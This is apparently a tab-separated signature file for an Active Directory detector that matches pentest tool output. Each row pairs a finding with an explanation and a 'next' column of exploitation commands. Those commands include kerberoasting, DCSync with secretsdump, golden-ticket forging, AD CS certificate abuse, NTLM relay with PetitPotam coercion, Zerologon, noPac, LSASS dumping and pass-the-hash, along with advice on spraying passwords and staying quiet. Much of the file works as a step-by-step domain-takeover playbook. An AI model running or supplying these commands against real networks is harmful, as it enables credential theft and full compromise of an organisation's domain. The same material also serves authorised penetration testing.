column1: # Active Directory attack & enumeration signatures. The `ad` detector strips terminal colours
# off each line of an AD tooling dump - NetExec/CrackMapExec, enum4linux-ng, ldapsearch,
# BloodHound/SharpHound, PowerView, Impacket, Rubeus, Certipy, Responder, the coercion tools -
# tests it against every `pattern` (a case-insensitive Java regex), and reports each hit with a
# plain-English "what it is" and "next: where to take it".
# This is the same regex-per-row engine the winPEAS/linPEAS detectors use (silverdetector.detect.
# Signatures), so covering one more tool, technique or CVE is a single new row - no code.
# ADD YOUR OWN: append a row. `pattern` is a Java regex (already case-insensitive), tabs separate
# columns, `category` only groups the output, and `next` is the exploitation pointer. Write the
# pattern to match the line that means the finding is TRUE (e.g. "signing:False", "(Pwn3d!)",
# "Vulnerable to ESC1"), not the line that merely checks for it.
# id                pattern    severity  category  title  meaning  next

column6: meaning
column7: next

column1: # ---- tool banners (low severity: just says which tool produced the paste) --------------------

column6: The Swiss-army knife for AD: authenticates over SMB/LDAP/WinRM/MSSQL/RDP across a subnet and enumerates, sprays and dumps.
column7: nxc smb <targets> -u user -p pass --shares --users --pass-pol ; add --sam/--lsa/--ntds once you are admin

column6: The scripts (secretsdump, GetUserSPNs, GetNPUsers, psexec, ntlmrelayx, ...) behind most AD attacks. The specific script tells you the technique.
column7: pick the script for the step you are on; see the Kerberos/dumping findings below

column6: Graphs the domain's users, groups, sessions and ACLs to find the shortest path to Domain Admin. The edges below are what to abuse.
column7: import the zip into BloodHound; run "Shortest paths to Domain Admins" and read the edges

column6: In-domain enumeration from a foothold - users, groups, ACLs, delegation, trusts - without dropping tools that touch disk.
column7: Get-DomainUser -SPN ; Get-DomainUser -PreauthNotRequired ; Find-InterestingDomainAcl

column6: Reading the directory over LDAP. Every user/computer attribute is a lead: SPNs, UAC flags, delegation, LAPS, descriptions.
column7: ldapsearch -x -H ldap://<dc> -b "DC=corp,DC=local" ; grep servicePrincipalName / userAccountControl

column6: Enumerating Active Directory Certificate Services for vulnerable templates and CA misconfigurations (the ESC1-ESC13 family).
column7: certipy find -u user@dom -p pass -dc-ip <dc> -vulnerable -stdout

column6: Validates usernames and sprays passwords over Kerberos pre-auth - fast, and by default not logged as 4625 logon failures.
column7: kerbrute userenum -d dom --dc <dc> users.txt ; kerbrute passwordspray -d dom users.txt 'Season2024!'

column2: (null session|sessions using username '', password ''|anonymous logon|allows sessions using a NULL)
column6: The host accepts an unauthenticated SMB/RPC session, so you can enumerate users, groups and the password policy with no credentials.
column7: enum4linux-ng -A <host> ; rpcclient -U "" -N <host> then enumdomusers

column6: The directory answers unauthenticated LDAP queries, dumping users, computers and their attributes to anyone on the network.
column7: ldapsearch -x -H ldap://<dc> -b "DC=corp,DC=local" "(objectClass=user)"

column6: Account names were recovered by walking RIDs / SIDs - the raw material for password spraying, AS-REP roasting and kerberoasting.
column7: build a user list; feed it to kerbrute or a spray

column6: The domain's default lets any user create computer accounts. A machine account you control is the pivot for RBCD and several ADCS/Kerberos abuses.
column7: addcomputer.py -computer-name evil$ -computer-pass P@ss dom/user:pass ; then RBCD or S4U

column6: Short or non-complex passwords are permitted, so a spray with a season/company guess is likely to land.
column7: spray a common password across the enumerated users (watch the lockout policy first)

column6: Passwords lock out after a few tries - spray slowly (one guess per account per window) or you will lock the domain and get caught.
column7: one attempt per account, then wait the observation window; prefer Kerberos (kerbrute) spraying

column6: The base DN and forest root - what to pass as the LDAP search base and a confirmation of the domain/forest name.
column7: use it as -b "DC=corp,DC=local" in your LDAP queries

column6: A username/password (or hash) authenticated. Domain creds unlock LDAP/BloodHound as a user, share access, and spraying the pair everywhere else.
column7: nxc smb <targets> -u user -p pass ; collect BloodHound as this user

column5: Local admin / Pwn3d! on a host
column6: The account is a local administrator here - full control of the box: dump SAM/LSASS, run code, and move on.
column7: nxc smb <host> -u u -p p --sam --lsa ; or psexec.py / evil-winrm for a shell

column6: Group Policy Preferences stored a password AES-encrypted with a key Microsoft published, so it is trivially reversible - and readable by any domain user in SYSVOL.
column7: gpp-decrypt <cpassword> ; or Get-GPPPassword remotely

column6: You can read the randomised local administrator password of a machine via LAPS - a direct local admin credential for that host.
column7: nxc ldap <dc> -u u -p p -M laps ; or read ms-Mcs-AdmPwd over LDAP

column6: A user/computer attribute (often Description) holds what looks like a password - a classic place admins stash them.
column7: read the attribute and try the credential across the domain

column6: A sprayed password matched at least one account - valid domain credentials with no cracking needed.
column7: confirm with nxc; collect BloodHound as the account

column6: The password is correct but must be changed at next logon - still valid, and you can reset it yourself over SMB/RPC.
column7: smbpasswd -r <dc> -U user ; or rpcclient setuserinfo2

column6: You have tripped the lockout policy. Keep going and you lock accounts, generate alerts, and lose the spray.
column7: stop; wait the reset window; slow down to one guess per account per window

column6: Any domain user can request a service ticket for an account that has an SPN; the ticket is encrypted with that account's password hash and cracks offline with no lockout.
column7: GetUserSPNs.py dom/user:pass -request ; crack the $krb5tgs$ with hashcat -m 13100

column6: An account has "do not require Kerberos pre-authentication" set, so its AS-REP can be requested with no credentials and cracked offline to the password.
column7: GetNPUsers.py dom/ -usersfile users.txt -no-pass -request ; crack $krb5asrep$ with hashcat -m 18200

column6: The account has a Service Principal Name, so it is a kerberoasting target - request its ticket and crack it offline.
column7: GetUserSPNs.py -request ; the resulting $krb5tgs$ goes to hashcat -m 13100

column6: An NT hash (or AES key) is being turned into a full Kerberos TGT, upgrading a hash into ticket-based access to Kerberos-only services.
column7: getTGT.py dom/user -hashes :<NT> ; export KRB5CCNAME then use -k -no-pass

column6: A Kerberos ticket (.ccache/.kirbi) is being injected and reused, authenticating as its owner with no password.
column7: export KRB5CCNAME=ticket.ccache ; psexec.py -k -no-pass dom/user@host

column6: The krbtgt account's hash signs every TGT in the domain. With it you forge tickets for any user - domain-wide, long-lived, hard to revoke persistence.
column7: ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain dom Administrator

column6: A service account's hash forges a service ticket directly to one service (CIFS/HOST/HTTP...), bypassing the DC and much logging.
column7: ticketer.py -nthash <svc> -domain-sid <sid> -spn cifs/host dom user

column6: On an unpatched DC, a normal user forges a PAC claiming Domain Admin membership - instant domain compromise.
column7: goldenPac.py dom/user:pass@dc  (confirm the DC is unpatched first)

column6: A computer (not the DC) can impersonate any user who authenticates to it. Coerce a DC to authenticate, capture its TGT, and DCSync.
column7: monitor with Rubeus; coerce the DC (PetitPotam/PrinterBug) then extract and reuse its TGT

column6: The account can request tickets to specific services on behalf of any user (including Domain Admins) via S4U2Self+S4U2Proxy.
column7: getST.py -spn <target-spn> -impersonate Administrator dom/svc -hashes :<NT>

column6: If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a target, a computer account you control can impersonate anyone to it - a common path to local SYSTEM.
column7: rbcd.py -delegate-to target$ -delegate-from evil$ -action write dom/user ; then getST -impersonate Administrator

column6: Full control of the target object. Over a user: reset its password or add Shadow Credentials. Over a group: add yourself. Over a computer: RBCD.
column7: depending on target: reset password / add to group / set RBCD / AddKeyCredentialLink

column6: Write any non-protected attribute of the target - enough for a targeted kerberoast (set an SPN), Shadow Credentials, or a logon-script swap.
column7: set servicePrincipalName then kerberoast; or add msDS-KeyCredentialLink (Whisker/pywhisker)

column6: You can rewrite the object's ACL, granting yourself full control - and, on the domain object, DCSync rights.
column7: dacledit.py to grant yourself GenericAll / DS-Replication rights, then abuse them

column6: Make yourself the owner, then grant yourself full control - a two-step route to GenericAll on the target.
column7: owneredit.py -action write -new-owner you -target target$ ; then dacledit

column6: Reset the target user's password without knowing the old one - a direct account takeover.
column7: net rpc password <user> -U dom/you ; or Set-DomainUserPassword (PowerView)

column6: You can add members to the group. If it is privileged (Domain Admins, a nested admin group), add yourself and inherit its rights.
column7: net rpc group addmem "Group" you -U dom/you ; or Add-DomainGroupMember

column6: Writing msDS-KeyCredentialLink adds an attacker-controlled certificate to the target, letting you PKINIT-authenticate as it and recover its NT hash - no password reset needed, so it is quiet.
column7: pywhisker -a add ... ; then certipy/gettgtpkinit auth as the target

column6: The principal can replicate directory secrets, i.e. pull every account's hash (including krbtgt) straight from the DC as if it were another DC.
column7: secretsdump.py -just-dc dom/user@dc ; or lsadump::dcsync /all

column6: A BloodHound edge granting an interactive foothold: CanPSRemote (WinRM), CanRDP (Remote Desktop), ExecuteDCOM, or SQLAdmin. Combine with local-admin or a service to run code.
column7: CanPSRemote: evil-winrm ; CanRDP: xfreerdp ; ExecuteDCOM: dcomexec.py ; SQLAdmin: mssqlclient.py

column6: The object is (or was) a member of a protected privileged group; AdminSDHolder re-stamps its ACL. A high-value target worth focusing on.
column7: prioritise this account/group; check what privileged group it belongs to

column6: A template lets a low-priv user enrol and set an arbitrary subject/UPN with a client-auth EKU, so you request a cert AS a Domain Admin and authenticate as them.
column7: certipy req -u user@dom -p pass -ca <CA> -template <t> -upn administrator@dom ; certipy auth -pfx administrator.pfx

column6: The template's EKU is Any Purpose (or no EKU / SubCA), so an issued cert can be used to authenticate as anyone, ESC1-style.
column7: certipy req ... then use the cert for PKINIT as a privileged user

column6: An enrollment-agent cert lets you request certs on behalf of other users, so you enrol as a Domain Admin.
column7: certipy req -template <agent> ; then -on-behalf-of dom\\administrator

column6: You can edit the certificate template's ACL. Reconfigure it into an ESC1 (enrollee supplies subject + client auth) and enrol as an admin.
column7: certipy template -template <t> -write ... to make it vulnerable, then ESC1

column6: The CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 lets any request specify an arbitrary SAN, so any enrollable template becomes an ESC1.
column7: certipy req -template User -upn administrator@dom (CA applies your SAN)

column6: You hold ManageCA/ManageCertificates on the CA - enable the SAN flag (ESC6), approve your own requests, or add a template.
column7: certipy ca -enable-template ... / -issue-request ; then request a client-auth cert

column5: ESC8 - NTLM relay to AD CS web enrollment
column6: The CA's HTTP enrollment endpoint accepts NTLM, so coerce a machine (PetitPotam) and relay its auth to get a cert for that machine account - then DCSync via the DC's cert.
column7: ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs ; then PetitPotam the DC

column6: The template omits the SID security extension, so combined with a mapped altname it enables cert-based impersonation of another account.
column7: certipy with -upn of the victim (chain with GenericWrite over the source user)

column6: Weak cert-to-account mapping on the DC lets a cert with a spoofed UPN/altname authenticate as another user.
column7: set the victim's UPN / altname and PKINIT as them

column5: ESC11 - relay to the RPC enrollment (ICPR)
column6: The CA's RPC certificate interface accepts unencrypted requests, so NTLM can be relayed to it (the RPC analogue of ESC8).
column7: ntlmrelayx with the ICPR/-rpc target ; coerce a machine to authenticate

column5: ESC13 - issuance policy linked to a group
column6: A template's issuance policy OID is linked to a privileged group, so enrolling yields a token with that group's rights.
column7: certipy req the template; the issued cert grants the linked group's access

column6: Certipy marked a template or CA as vulnerable to a certificate-abuse technique (the ESC family). Read which ESC and follow it.
column7: read the ESC number in the finding; certipy req/auth per that technique

column6: Forces a target (often a DC) to authenticate to you over MS-EFSRPC with no credentials - the classic front half of an ADCS ESC8 relay to full domain compromise.
column7: PetitPotam.py <relay-listener> <dc> while ntlmrelayx --adcs relays to the CA

column6: The Print System Remote Protocol coerces a host with the Spooler running to authenticate to you - feeds unconstrained-delegation and relay attacks.
column7: dementor.py / printerbug.py <target> <listener> ; capture or relay the auth

column6: Coerces authentication over the DFS namespace protocol - another Spooler-independent trigger for relay/delegation attacks.
column7: DFSCoerce.py -u user -p pass <listener> <dc>

column6: Coerces authentication via the File Server VSS Agent protocol - yet another coercion trigger when the Spooler is disabled.
column7: ShadowCoerce PoC <listener> <target>

column6: Captured authentication is being relayed to another host. Against LDAP it can grant RBCD/Shadow-Cred rights; against ADCS a cert; against SMB a shell - wherever signing is not enforced.
column7: ntlmrelayx.py -tf targets.txt -smb2support (add --delegate-access / --adcs as needed)

column5: Responder poisoning captured a NetNTLM hash
column6: LLMNR/NBT-NS/mDNS poisoning answered a name lookup and captured a NetNTLMv2 response. Crack it offline, or relay it live if SMB signing is not required.
column7: crack: hashcat -m 5600 ; or relay: ntlmrelayx to a signing-off host (relaying beats cracking)

column6: Rogue DHCPv6 makes you the network's IPv6 DNS server, so Windows clients hand you their authentication (WPAD) - pair with ntlmrelayx to LDAP for RBCD.
column7: mitm6 -d dom.local + ntlmrelayx.py -6 -t ldaps://<dc> --delegate-access

column6: A host with the WebClient service running can be coerced over HTTP, which relays to ADCS/LDAP even when SMB signing is on.
column7: check WebDAV status (nxc -M webdav); coerce over HTTP to relay to the CA

column6: A Netlogon crypto flaw lets an unauthenticated attacker set the DC's machine-account password to empty, then DCSync the domain. Instant, unauthenticated domain takeover on unpatched DCs.
column7: zerologon PoC to test, then secretsdump -just-dc (RESTORE the DC's password after - it breaks the DC)

column6: Combining CVE-2021-42278 and -42287, a user with MachineAccountQuota renames a computer to a DC's name to obtain a Domain-Admin service ticket.
column7: noPac.py -dc-ip <dc> dom/user:pass -impersonate administrator -use-ldap

column6: A Print Spooler flaw runs an attacker DLL as SYSTEM - local privesc, and remote code execution against a DC still running the Spooler.
column7: CVE-2021-1675 PoC pointing at a malicious DLL on a share

column6: The domain's hash database is being pulled - every account's NT hash, including krbtgt. This is game over: pass-the-hash anywhere, forge Golden Tickets, or crack offline.
column7: secretsdump.py -just-dc dom/user@dc ; the krbtgt hash forges Golden Tickets

column6: LSASS holds the hashes and sometimes cleartext of everyone logged on to this host - dumping it yields credentials for lateral movement, often to more privileged accounts.
column7: mimikatz sekurlsa::logonpasswords ; or nxc -M lsassy / --lsa

column6: The host cached domain logons so users can sign in offline. These verifiers cannot be passed - only cracked (hashcat -m 2100) - but a cracked one is a real password.
column7: nxc smb <host> --lsa ; crack the $DCC2$ with hashcat -m 2100

column6: Command execution on a remote host over SMB/WMI/DCOM using admin credentials or a hash - the standard lateral-movement step.
column7: wmiexec.py dom/user@host (quieter than psexec) ; or -hashes for pass-the-hash

column6: PowerShell Remoting / WinRM (5985/5986) is a clean interactive shell for accounts in Remote Management Users or local admins.
column7: evil-winrm -i <host> -u user -p pass  (or -H <NT> for pass-the-hash)

column6: An NT hash is being used to authenticate directly, with no password and no cracking - it works anywhere the account is a local admin.
column7: nxc smb <targets> -u user -H <NT> ; psexec.py -hashes :<NT>

column6: A trust to another domain or forest widens the attack surface - foreign group memberships, and with a trust key, inter-realm ticket forging.
column7: Get-DomainTrust / nltest /domain_trusts ; enumerate foreign privileged access

column6: SID history lets a principal carry another domain's privileged SID. In a forged inter-realm ticket, an Enterprise Admin SID crosses the trust.
column7: ticketer.py ... -extra-sid <EnterpriseAdmins-SID> for cross-trust escalation
